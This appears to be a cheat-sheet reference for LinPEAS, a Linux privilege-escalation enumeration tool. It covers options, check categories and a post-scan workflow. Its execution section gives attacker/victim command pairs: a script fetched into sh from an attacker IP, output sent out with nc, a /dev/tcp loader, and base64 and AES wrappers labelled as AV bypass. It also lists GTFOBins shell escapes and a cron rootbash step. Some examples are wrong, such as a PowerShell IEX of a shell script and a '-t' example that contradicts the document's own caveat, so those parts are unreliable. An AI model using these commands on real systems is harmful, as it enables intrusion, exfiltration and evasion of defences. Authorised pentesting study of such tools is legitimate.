---
title: LinPEAS
tool: linpeas
version: latest
category: Privilege Escalation
platform: Linux/macOS/Unix
language: Shell (POSIX sh)
license: GPL-3.0
github: https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS
kali: https://www.kali.org/tools/linpeas/
mitre_tactic: privilege_escalation
mitre_tactic_id: TA0004
tags:
  - linux
  - privilege-escalation
  - enumeration
  - automation
  - misconfigurations
  - credentials
  - containers
  - cron
  - capabilities
---

# LinPEAS

## 1. Overview

**LinPEAS** (Linux Privilege Escalation Awesome Script) is an automated privilege escalation path discovery tool for Linux/Unix/macOS systems. It performs comprehensive enumeration across system information, processes, cron jobs, services, sockets, network configuration, users, software, and files — then highlights potential misconfigurations using color-coded output.

**Key capabilities:**
- No external dependencies — runs on any system with `/bin/sh`
- 400+ individual checks across 9+ categories
- Color-coded output: Red/Yellow for high-confidence privesc vectors, Red for suspicious configurations
- Network scanning and host discovery built in
- Custom-built stripped versions via the builder system
- Firmware analysis support via `-f` parameter
- macOS auto-detection (MacPEAS mode)
- Process monitoring for frequent cron jobs
- Top 2000 password brute-force with `su` for all users

**Advantages over manual enumeration:**
- Automates hundreds of checks that would take hours manually
- Consistent color-coded prioritization of findings
- Covers edge cases (SUID, capabilities, LD_PRELOAD, cgroups, namespaces)
- Actively maintained with new checks added regularly

**Typical scenarios:** Post-exploitation enumeration on a compromised Linux host to identify misconfigurations, weak permissions, credentials, kernel exploits, or container escape vectors.

## 2. Installation

### Quick Download

```bash
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

**Explanation:** Downloads and immediately pipes to `sh` for execution. Use only when you trust the source.

### Manual Download

```bash
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
```

### From Kali Linux

```bash
sudo apt install linpeas
```

### Binary Version

```bash
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_linux_amd64
chmod +x linpeas_linux_amd64
./linpeas_linux_amd64
```

**Caveat:** The binary version is not obfuscated and may trigger AV/EDR. Use the shell script with encryption for AV evasion.

### Build Custom LinPEAS

```bash
# Use the builder to include only selected checks
cd linPEAS/builder
python3 builder.py
```

**Explanation:** The builder system allows creating stripped-down versions with only specific checks. Useful for stealth operations or reducing scan time.

## 3. Script Variants

| Variant | Description | Size |
|---------|-------------|------|
| `linpeas_fat.sh` | All checks + embedded third-party tools (base64) | ~7 MB |
| `linpeas.sh` | All checks + linux-exploit-suggester embedded | ~1.5 MB |
| `linpeas_small.sh` | Most critical checks only | ~300 KB |

**Recommendation:** Use `linpeas.sh` for standard assessments. Use `linpeas_small.sh` for time-constrained engagements. Use `linpeas_fat.sh` when you need embedded exploit suggesters.

## 4. Command-Line Options

### Privilege Escalation Checks

```bash
# Full scan (all checks including regex, password brute-force, process monitoring)
./linpeas.sh -a

# Stealth mode (no disk writes, faster)
./linpeas.sh -s

# Extra enumeration
./linpeas.sh -e

# Regex checks for API keys (can take minutes to hours)
./linpeas.sh -r

# Pass known password for sudo -l and su brute-force
./linpeas.sh -P 'knownpassword'

# Debug mode (shows timing and skipped checks)
./linpeas.sh -D

# Only specific check groups
./linpeas.sh -o system_information,users_information,software_information

# Wait between blocks (manual inspection)
./linpeas.sh -w

# Disable colors
./linpeas.sh -N

# Suppress banner
./linpeas.sh -q
```

### Network Scanning

```bash
# Auto-discover subnets + hosts + ports
./linpeas.sh -t

# Host discovery with CIDR
./linpeas.sh -d 192.168.1.0/24

# Host discovery + custom ports
./linpeas.sh -d 192.168.1.0/24 -p 22,80,443

# Scan single IP
./linpeas.sh -i 192.168.1.50

# Scan single IP with ports
./linpeas.sh -i 192.168.1.50 -p 21,22,80,443,8080
```

**Caveat:** When `-d`, `-p`, or `-i` are used WITHOUT `-t`, linpeas runs in pure network scanning mode and skips all privilege escalation checks.

### Port Forwarding

```bash
# Forward local port to remote
./linpeas.sh -F 127.0.0.1:8080:10.10.10.5:80
```

### Firmware Analysis

```bash
# Emulated firmware (chroot into mounted filesystem)
cp /path/to/linpeas.sh /mnt/linpeas.sh
chroot /mnt
bash /linpeas.sh -o software_information,interesting_files,api_keys_regex

# Non-emulated (analyze folder contents)
./linpeas.sh -f /path/to/folder
```

### Force Modes

```bash
# Force linpeas execution (skip checks)
./linpeas.sh -L

# Force macpeas execution
./linpeas.sh -M
```

## 5. Execution Methods

### Direct Execution

```bash
./linpeas.sh -a > /dev/shm/linpeas.txt
less -r /dev/shm/linpeas.txt
```

**Explanation:** Output to `/dev/shm` (tmpfs) avoids disk writes. `less -r` preserves color codes.

### From Memory (No Disk Write)

```bash
curl -s http://10.10.14.5:8000/linpeas.sh | sh
```

**Explanation:** Downloads and executes entirely in memory. No file touches disk.

### With Output to Remote

```bash
# On attacker (receive)
nc -lvnp 9002 | tee linpeas.out

# On victim (send)
curl http://10.10.14.5:8000/linpeas.sh | sh | nc 10.10.14.5 9002
```

### Via Netcat (No curl)

```bash
# On attacker
sudo nc -q 5 -lvnp 80 < linpeas.sh

# On victim
cat < /dev/tcp/10.10.14.5/80 | sh
```

### Base64 Encoded (AV Bypass)

```bash
# On attacker (encode)
base64 -w0 linpeas.sh > lp.enc
sudo python3 -m http.server 80

# On victim (decode and execute)
curl http://10.10.14.5/lp.enc | base64 -d | sh
```

### OpenSSL Encrypted (AV Bypass)

```bash
# On attacker (encrypt)
openssl enc -aes-256-cbc -pbkdf2 -salt -pass pass:AVBypassWithAES -in linpeas.sh -out lp.enc
sudo python3 -m http.server 80

# On victim (decrypt and execute)
curl http://10.10.14.5/lp.enc | openssl enc -aes-256-cbc -pbkdf2 -d -pass pass:AVBypassWithAES | sh
```

### PowerShell Download (Windows Targets)

```bash
# On attacker
sudo python3 -m http.server 80

# On victim (PowerShell)
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/linpeas.sh')"
```

**Explanation:** For cross-platform assessments where a Linux script may be transferred through a Windows foothold.

## 6. Color Coding System

LinPEAS uses colors to prioritize findings:

| Color | Meaning | Action |
|-------|---------|--------|
| **Red/Yellow** (`[+]` `b32400`) | High-confidence privesc vector (99% certain) | Investigate immediately |
| **Red** (`[+]` `ff5000`) | Suspicious configuration, possible privesc | Review and verify |
| **Green** (`[+]` `66ff33`) | Known good configuration (by name, not content) | Low priority |
| **Blue** (`[+]` `006fff`) | Users without shell / mounted devices | Informational |
| **Light Cyan** (`[+]` `33ccff`) | Users with shell access | Note for lateral movement |
| **Light Magenta** (`[+]` `bf80ff`) | Current username highlighted | Context reference |

**Caveat:** Green means the configuration is "known good" by name — the actual content may still be misconfigured. Always verify manually.

## 7. Check Categories

### 7.1 System Information

- OS version, kernel version, architecture
- Sudo version (check for known CVEs)
- SELinux/AppArmor/Grsecurity status
- ASLR configuration
- Path variable (writable directories?)
- Environment variables (credentials, API keys)
- Available compilers (for kernel exploit compilation)
- CPU information
- Disk usage and mounted filesystems

### 7.2 Container/Cloud Detection

- Docker container detection (cgroup, `.dockerenv`)
- LXC/LXD container detection
- Kubernetes pod detection
- AWS/GCP/Azure metadata access
- Mount namespace isolation
- Container capabilities enumeration

### 7.3 Processes, Cron, Timers, Services, Sockets

- Running processes and their permissions
- Cron jobs (system and user)
- Systemd timers
- Systemd services (writable `.service` files, relative paths)
- Unix domain sockets (writable sockets, Docker socket)
- Process memory (deleted executables, open files)
- Cross-user parent-child chains

### 7.4 Network Information

- Interfaces, IPs, routes
- Open ports and listeners
- DNS configuration
- Firewall rules (iptables, nftables, ufw)
- Network namespaces
- ARP table

### 7.5 Users and Groups

- Current user and group memberships
- `/etc/passwd` enumeration (UID 0 accounts)
- Sudo permissions (`sudo -l`)
- Home directories and SSH keys
- Users with shells
- Superuser accounts
- Password status

### 7.6 Software Information

- Installed package versions (dpkg, rpm, pacman)
- Vulnerable software detection
- SUID/SGID binaries
- Capabilities on binaries
- Writable binaries in PATH
- Docker/LXC container capabilities
- Available compilers

### 7.7 Interesting Files

- SUID/SGID binaries with known privesc vectors
- World-readable/writable sensitive files
- Password files (`/etc/shadow`, backup files)
- SSH keys and configuration
- History files (`.bash_history`, `.mysql_history`)
- API keys and tokens (with `-r` regex checks)
- Backup files in `/var`, `/tmp`, `/etc`
- NFS exports with `no_root_squash`
- Web application files with hardcoded credentials
- Configuration files with embedded passwords

## 8. Detailed Check Breakdown

### SUID/SGID Binary Checks

LinPEAS cross-references discovered SUID/SGID binaries against known exploit lists:

| Binary | Exploitation | Reference |
|--------|-------------|-----------|
| `nmap` (older) | `--interactive` → `!sh` | GTFOBins |
| `vim` | `:!sh` | GTFOBins |
| `find` | `-exec /bin/sh \;` | GTFOBins |
| `bash` | `-p` | GTFOBins |
| `python` | `import os; os.execl('/bin/sh','sh','-p')` | GTFOBins |
| `perl` | `-e 'exec "/bin/sh";'` | GTFOBins |
| `less` | `!sh` | GTFOBins |
| `awk` | `BEGIN {system("/bin/sh")}` | GTFOBins |
| `env` | `/bin/sh` | GTFOBins |
| `cp` | Overwrite `/etc/passwd` or `/etc/shadow` | GTFOBins |

### Capabilities Checks

LinPEAS checks for exploitable capabilities on binaries:

| Capability | Exploitation |
|-----------|-------------|
| `cap_setuid` | Set UID to root on own process |
| `cap_setgid` | Set GID to root group |
| `cap_dac_override` | Bypass file permission checks |
| `cap_dac_read_search` | Bypass read permission checks |
| `cap_net_raw` | Sniff network traffic |
| `cap_sys_admin` | Mount filesystems, various admin operations |
| `cap_sys_ptrace` | Trace any process |
| `cap_fowner` | Bypass file ownership checks |
| `cap_chown` | Change file ownership |
| `cap_net_bind_service` | Bind to privileged ports |

### Cron Job Checks

LinPEAS identifies cron-related privesc vectors:

| Finding | Risk |
|---------|------|
| Writable cron script run by root | Overwrite with reverse shell |
| PATH manipulation in crontab | Plant malicious binary in PATH |
| Wildcard injection in cron | Craft filenames that become arguments |
| Cron running script in writable directory | Replace script or add symlinks |
| System crontab with weak permissions | Modify schedule or commands |
| User crontab with sensitive operations | Hijack or abuse scheduled tasks |

### Service Checks

LinPEAS identifies systemd-related privesc vectors:

| Finding | Risk |
|---------|------|
| Writable `.service` file | Add `ExecStart` with backdoor |
| Relative path in service file | Plant binary in writable PATH dir |
| Writable service binary | Replace with malicious binary |
| Socket activation with missing service | Create service that runs as root |
| Writable `.timer` file | Point to malicious service |
| Writable `.socket` file | Add `ExecStartPre` with backdoor |

### Network Checks

LinPEAS identifies network-related privesc vectors:

| Finding | Risk |
|---------|------|
| Writable Docker socket | Mount host filesystem |
| Open ports with weak services | Exploit service vulnerability |
| NFS shares with `no_root_squash` | Mount and create SUID binary |
| SSH keys in user directories | Use for lateral movement |
| Exposed credentials in config files | Use for authentication |
| Proxy configurations | Abuse for traffic interception |

## 9. Practical Examples

### Full CTF Scan

```bash
./linpeas.sh -a -r > /dev/shm/linpeas_full.txt
less -r /dev/shm/linpeas_full.txt
```

**Explanation:** `-a` enables all checks (password brute-force, process monitoring, extra hashes). `-r` enables regex-based API key detection. Output to tmpfs for stealth.

### Quick Production Scan

```bash
./linpeas.sh -s -q -N > /dev/shm/linpeas_quick.txt
```

**Explanation:** `-s` stealth mode, `-q` suppress banner, `-N` no colors (for log files). Fast and clean output.

### With Known Password

```bash
./linpeas.sh -P 'Summer2024!' > /dev/shm/linpeas.txt
```

**Explanation:** The password is tested against `sudo -l` and used to brute-force other users via `su`.

### Network Discovery Only

```bash
./linpeas.sh -t -d 10.10.10.0/24
```

**Explanation:** Pure network scanning mode — discovers hosts and ports without running privesc checks.

### Firmware Password Search

```bash
./linpeas.sh -f /mnt/firmware_root -o interesting_files
```

**Explanation:** Searches the specified folder for passwords, misconfigured permissions, and interesting files.

### Targeted API Key Search

```bash
./linpeas.sh -r -o interesting_files,api_keys_regex
```

**Explanation:** Runs only the file enumeration and regex-based API key detection. Faster than a full scan with `-r`.

### Monitor for Cron Jobs

```bash
./linpeas.sh -a -o procs_crons_timers_srvcs_sockets
```

**Explanation:** Monitors processes for 1 minute to detect frequent cron jobs. Useful for identifying short-lived scheduled tasks.

### Debug Scan Timing

```bash
./linpeas.sh -D 2>&1 | tee /dev/shm/linpeas_debug.txt
```

**Explanation:** Shows how long each check takes and which checks were skipped. Useful for optimizing custom builds.

## 10. Post-Scan Workflow

After running LinPEAS, follow this methodology:

1. **Check all Red/Yellow findings first** — these are high-confidence privesc vectors
2. **Verify Red findings manually** — they are suspicious but need validation
3. **Cross-reference with manual checks:**
   ```bash
   # Verify sudo permissions
   sudo -l

   # Check SUID binaries
   find / -perm -4000 -type f 2>/dev/null

   # Check capabilities
   getcap -r / 2>/dev/null

   # Check kernel version for exploits
   uname -r
   searchsploit "linux kernel $(uname -r | cut -d. -f1,2)"
   ```
4. **Check for container escape** if inside a container
5. **Review network findings** for lateral movement opportunities
6. **Test found credentials** on other services (SSH, database, web)
7. **Check history files** for additional credentials or information

### Post-Exploitation Checklist

```bash
# After finding a privesc vector, verify it works:
# 1. SUID binary
./suid_binary -p  # or the specific GTFOBins command

# 2. Capabilities
./cap_binary  # check GTFOBins for the specific capability

# 3. Sudo misconfig
sudo -u#0 /bin/bash  # or the specific command from sudo -l

# 4. Cron job
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > /path/to/writable/script

# 5. Kernel exploit
gcc exploit.c -o exploit && ./exploit

# 6. Container escape
# (varies by container type and misconfiguration)
```

## 11. MITRE ATT&CK Mapping

| Technique | LinPEAS Check |
|-----------|--------------|
| T1068 Exploitation for Privilege Escalation | Kernel version, SUID binaries, capabilities |
| T1078 Valid Accounts | User enumeration, password files, SSH keys |
| T1134 Access Token Manipulation | Sudo misconfigurations, suid binaries |
| T1574 Hijack Execution Flow | Writable PATH directories, library injection |
| T1053 Scheduled Task/Job | Cron job enumeration, writable scripts |
| T1611 Escape to Host | Container detection, Docker socket, capabilities |
| T1082 System Information Discovery | OS/kernel info, environment variables |
| T1083 File and Directory Discovery | Sensitive file enumeration, backup files |
| T1049 System Network Connections | Open ports, network interfaces |
| T1057 Process Discovery | Running process enumeration |
| T1003 OS Credential Dumping | Shadow file, history files, memory dumps |
| T1552 Unsecured Credentials | Hardcoded passwords, API keys, config files |
| T1557 Adversary-in-the-Middle | Network sniffing capability, ARP poisoning |
| T1613 Container and Resource Discovery | Docker, LXC, Kubernetes detection |
| T1046 Service Scanning | Network port scanning mode |

## Resources

- [GitHub Repository](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS)
- [PEASS-ng Releases](https://github.com/peass-ng/PEASS-ng/releases/latest)
- [Kali Linux Tool Page](https://www.kali.org/tools/linpeas/)
- [HackTricks - Linux Privilege Escalation](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html)
- [HackTricks LinPEAS Training](https://hacktricks-training.com/courses/lhe/)
- [LinPEAS Builder (Custom Builds)](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS/builder)
- [PEASS Shop](https://teespring.com/stores/peass)
- [Linux Privilege Escalation Checklist](https://book.hacktricks.wiki/en/linux-hardening/linux-privilege-escalation-checklist.html)
- [GTFOBins](https://gtfobins.github.io/)
- [LOLBAS (Living Off The Land)](https://lolbas-project.github.io/)
